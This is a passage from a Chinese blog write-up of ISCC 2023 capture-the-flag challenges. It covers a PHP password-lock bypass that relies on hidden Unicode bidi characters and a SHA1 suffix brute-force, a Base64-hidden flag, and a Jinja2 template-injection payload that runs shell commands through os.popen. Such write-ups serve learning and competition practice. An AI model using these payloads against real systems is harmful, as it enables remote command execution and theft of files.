dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.6. 汤姆历险记 </a> </li><li data-astro-cid-woz2nwfv> <a href="#人生之路" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.7. 人生之路 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#mobile" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4. Mobile </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#nojava" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.1. NOJAVA </a> </li><li data-astro-cid-woz2nwfv> <a href="#manyjni" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.2. ManyJNI </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#reverse" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5. Reverse </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#justdoit" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.1. JustDoIt </a> </li><li data-astro-cid-woz2nwfv> <a href="#变形记" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.2. 变形记 </a> </li><li data-astro-cid-woz2nwfv> <a href="#奇门遁甲" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.3. 奇门遁甲 </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <h2 id="写在前面">写在前面</h2>
+<p>由于整个五月份很忙，所以 Writeup 就开赛第一周写了一点，原本打算赛后趁着河南交题解开环境的时候复现，没想到不给开环境（写不完啦！就这样吧）… 不过手里还有部分附件，只能简单做做了。整体来看 ISCC 越来越夸张了，今年一血出了， 一个小时直接 400 解…</p>
+<!--more-->
+<h2 id="web">Web</h2>
+<h3 id="小周的密码锁">小周的密码锁</h3>
+<p>输入密码后提交发现有些异常，多出来一个 <code>password2</code>，我们直接 burp 爆破一下，发现 <code>password</code> 和 <code>password2</code> 等于 <code>5</code> 的时候会输出源代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://47.94.14.162:10008/?password=1&#x26;password2=1</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230509212507740.png" alt="image-20230509212507740"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">    function</span><span style="color:#B392F0"> MyHashCode</span><span style="color:#E1E4E8">($str)</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">        $h </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">        $len </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strlen</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> ($i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; $i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> $len; $i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">            $hash </span><span style="color:#F97583">=</span><span style="color:#B392F0"> intval40</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">intval40</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">40</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> $hash) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">($str[$i]));</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> abs</span><span style="color:#E1E4E8">($hash);</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    function</span><span style="color:#B392F0"> intval40</span><span style="color:#E1E4E8">($code)</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">        $falg </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $code </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ($falg </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">            $code </span><span style="color:#F97583">=</span><span style="color:#F97583"> ~</span><span style="color:#E1E4E8">($code </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> $code </span><span style="color:#F97583">*</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> $code;</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    function</span><span style="color:#B392F0"> Checked</span><span style="color:#E1E4E8">($str){</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">        $p1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/</span><span style="color:#DBEDFF">ISCC</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">($p1, $str)){</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="29"></span>
+<span class="line" data-line="30"><span style="color:#F97583">    function</span><span style="color:#B392F0"> SecurityCheck</span><span style="color:#E1E4E8">($sha1,$sha2,$user){</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">        </span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">        $p1 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/</span><span style="color:#F97583">^</span><span style="color:#DBEDFF">[a-z]</span><span style="color:#F97583">+$</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">        $p2 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/</span><span style="color:#F97583">^</span><span style="color:#DBEDFF">[A-Z]</span><span style="color:#F97583">+$</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="34"></span>
+<span class="line" data-line="35"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">($p1, $sha1) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> preg_match</span><span style="color:#E1E4E8">($p2, $sha2)){</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">            $sha1 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strtoupper</span><span style="color:#E1E4E8">($sha1);</span></span>
+<span class="line" data-line="37"><span style="color:#E1E4E8">            $sha2 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strtolower</span><span style="color:#E1E4E8">($sha2);</span></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">            $user </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strtoupper</span><span style="color:#E1E4E8">($user);</span></span>
+<span class="line" data-line="39"><span style="color:#E1E4E8">            $crypto </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $sha1 </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> $sha2;</span></span>
+<span class="line" data-line="40"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="41"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="42"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"wrong"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="43"><span style="color:#E1E4E8">        }       </span></span>
+<span class="line" data-line="44"></span>
+<span class="line" data-line="45"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">($crypto, $user);</span></span>
+<span class="line" data-line="46"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="47"><span style="color:#79B8FF">    error_reporting</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="48"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="49"><span style="color:#E1E4E8">    $user </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">];</span><span style="color:#6A737D">//user</span></span>
+<span class="line" data-line="50"><span style="color:#E1E4E8">    $sha1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'sha1'</span><span style="color:#E1E4E8">];</span><span style="color:#6A737D">//sha1</span></span>
+<span class="line" data-line="51"><span style="color:#E1E4E8">    $sha2 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'‮⁦//sha2⁩⁦sha2'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="52"><span style="color:#6A737D">    //‮⁦see me ⁩⁦can you </span></span>
+<span class="line" data-line="53"></span>
+<span class="line" data-line="54"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8"> ($_GET[</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">])) {</span></span>
+<span class="line" data-line="55"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ($_GET[</span><span style="color:#9ECBFF">'password2'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 5</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="56"><span style="color:#79B8FF">            show_source</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="57"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="58"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="59"><span style="color:#6A737D">            //Try to encrypt</span></span>
+<span class="line" data-line="60"><span style="color:#F97583">            if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($sha1) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> isset</span><span style="color:#E1E4E8">($sha2) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> isset</span><span style="color:#E1E4E8">($user)){</span></span>
+<span class="line" data-line="61"><span style="color:#E1E4E8">                [$crypto, $user] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SecurityCheck</span><span style="color:#E1E4E8">($sha1,$sha2,$user);</span></span>
+<span class="line" data-line="62"><span style="color:#F97583">                if</span><span style="color:#E1E4E8">((</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">sha1</span><span style="color:#E1E4E8">($crypto),</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> substr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">sha1</span><span style="color:#E1E4E8">($user),</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">substr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">sha1</span><span style="color:#E1E4E8">($user),</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'a05c53'</span><span style="color:#E1E4E8">){</span><span style="color:#6A737D">//welcome to ISCC</span></span>
+<span class="line" data-line="63"><span style="color:#E1E4E8">                    </span></span>
+<span class="line" data-line="64"><span style="color:#F97583">                    if</span><span style="color:#E1E4E8">((</span><span style="color:#B392F0">MyHashcode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"ISCCNOTHARD"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">===</span><span style="color:#B392F0"> MyHashcode</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">]))</span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#B392F0">Checked</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">])){</span></span>
+<span class="line" data-line="65"><span style="color:#F97583">                        include</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"f1ag.php"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="66"><span style="color:#79B8FF">                        echo</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="67"><span style="color:#E1E4E8">                    }</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="68"><span style="color:#F97583">                        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"就快解开了!"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="69"><span style="color:#E1E4E8">                    }</span></span>
+<span class="line" data-line="70"><span style="color:#E1E4E8">                    </span></span>
+<span class="line" data-line="71"><span style="color:#E1E4E8">                }</span></span>
+<span class="line" data-line="72"><span style="color:#F97583">                else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="73"><span style="color:#F97583">                    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"真的想不起来密码了吗?"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="74"><span style="color:#E1E4E8">                }</span></span>
+<span class="line" data-line="75"><span style="color:#E1E4E8">            }</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="76"><span style="color:#F97583">                die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"密钥错误!"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="77"><span style="color:#E1E4E8">            }</span></span>
+<span class="line" data-line="78"><span style="color:#E1E4E8">        }    </span></span>
+<span class="line" data-line="79"><span style="color:#E1E4E8">    }        </span></span>
+<span class="line" data-line="80"></span>
+<span class="line" data-line="81"><span style="color:#79B8FF">    mt_srand</span><span style="color:#E1E4E8">((</span><span style="color:#79B8FF">microtime</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">^</span><span style="color:#79B8FF"> rand</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">10000</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> rand</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1e4</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> rand</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1e4</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="82"><span style="color:#F97583">?></span></span></code></pre>
+<p>同时发现传参点有点不对劲，在 vscode 里我们清晰地看到存在 unicode 码，也是老考点了</p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230509212656416.png" alt="image-20230509212656416"></p>
+<p>唯一比较难过的点就是绕过两个 <code>if</code> 了，首先我们爆破后六位为 <code>a05c53</code> 的字符串</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> hashlib</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">def</span><span style="color:#B392F0"> sha1</span><span style="color:#E1E4E8">(string):</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> hashlib.sha1(string.encode(</span><span style="color:#9ECBFF">'utf-8'</span><span style="color:#E1E4E8">)).hexdigest()</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">100000000</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    string </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str</span><span style="color:#E1E4E8">(i)</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    hashed </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> sha1(string)</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> hashed[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:] </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'a05c53'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="10"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"username=</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">string</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">        break</span></span>
+<span class="line" data-line="12"><span style="color:#6A737D"># username=14987637</span></span></code></pre>
+<p>下面我们开始构造一个 <code>sha1 ^ sha2 == user </code> 的字符</p>
+<p>…</p>
+<p>最终 payload 如下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>?password=%01!SCCNOTHARD&#x26;username=14987637&#x26;sha1=ncxvshadewjpz&#x26;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=DFSNHPICAKYWV</span></span></code></pre>
+<h3 id="羊了个羊">羊了个羊</h3>
+<blockquote>
+<p>小张听说反应力与手速达到一定境界后就可以去打职业，于是他决定从一款小游戏中找找自信。</p>
+</blockquote>
+<p>在 JS 里面 <a href="http://47.94.14.162:10000/vue.global.js">http://47.94.14.162:10000/vue.global.js</a> , 注意是两层 Base64</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>U1ZORFEzdFpNRlJPWVZKdVZUTnRlVWhMTkdkNk1VVXlOelpwWm1nNFdIaEpmUT09</span></span>
+<span class="line" data-line="2"><span>SVNDQ3tZMFROYVJuVTNteUhLNGd6MUUyNzZpZmg4WHhJfQ==</span></span>
+<span class="line" data-line="3"><span>ISCC{Y0TNaRnU3myHK4gz1E276ifh8XxI}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230604142331872.png" alt="image-20230604142331872"></p>
+<h3 id="chatggg">Chatggg</h3>
+<p>感觉是 SSTI，简单 fuzz 了一下</p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230510143438437.png" alt="image-20230510143438437"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">{</span><span style="color:#F97583">%</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8"> lipsum</span><span style="color:#F97583">|</span><span style="color:#E1E4E8">attr(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">|</span><span style="color:#E1E4E8">attr(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\u0067\u0065\u0074</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">"os"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">|</span><span style="color:#E1E4E8">attr(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\u0070\u006f\u0070\u0065\u006e</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)(</span><span style="color:#9ECBFF">"cat /flllaag?txt"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">|</span><span style="color:#E1E4E8">attr(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\u0072\u0065\u0061\u0064</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)()</span><span style="color:#F97583">%</span><span style="color:#E1E4E8">}</span></span></code></pre>
+<h3 id="where_is_your_love">Where_is_your_love</h3>
+<blockquote>
+<p>寻找你的爱情故事</p>
+</blockquote>
+<p>访问页面有几个按钮，F12 看到对应 <code>Download.php</code>，<code>Enc.php</code> 和 <code>LoveStory.php</code>，访问  <code>Download.php</code> 后得到一个公钥 <code>keyiscc.pem</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>-----BEGIN PUBLIC KEY-----</span></span>
+<span class="line" data-line="2"><span>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq1z4KZn/krRpsVNGNkix</span></span>
+<span class="line" data-line="3"><span>/WyrrTjDauDMk4Hfd20R5zgzBHtUtvKeTeg3kHKp2k6Pcl3pGSAAGLeEWFORV5ew</span></span>
+<span class="line" data-line="4"><span>lvvSmov7WNZM6olsRs/QKbs03wP/YFUevmkl05ZtrXLlqlVohFddT0Q+BwcIdKfH</span></span>
+<span class="line" data-line="5"><span>hPsZRqFdDrGyLfFkEEMOGth3XXwNtkJAlKLjTSkf2PvTJ1Km2jhfn9gcizan20Ey</span></span>
+<span class="line" data-line="6"><span>5ufah/sBYqLSnNRYMg5R0pGiwcbmz3NzsNm8zopH5cNarrzVEeRlx86oqJw13CJB</span></span>
+<span class="line" data-line="7"><span>DYV0VRNjNgW2+FOQBnMjcH9pCu/zQA3fdXExXXA0+Oe7X+866tlurPWY0YotihgQ</span></span>
+<span class="line" data-line="8"><span>iwIDAQAB</span></span>
+<span class="line" data-line="9"><span>-----END PUBLIC KEY-----</span></span></code></pre>
+<hr>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">function</span><span style="color:#B392F0"> enc</span><span style="color:#E1E4E8">($data)</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    $str </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ""</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    $a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strrev</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">str_rot13</span><span style="color:#E1E4E8">($data));</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> ($i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; $i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> strlen</span><span style="color:#E1E4E8">($a); $i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">        $b </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">($a[$i]) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        $c </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $b </span><span style="color:#F97583">^</span><span style="color:#79B8FF"> 100</span><span style="color:#E1E4E8">;</span></span>
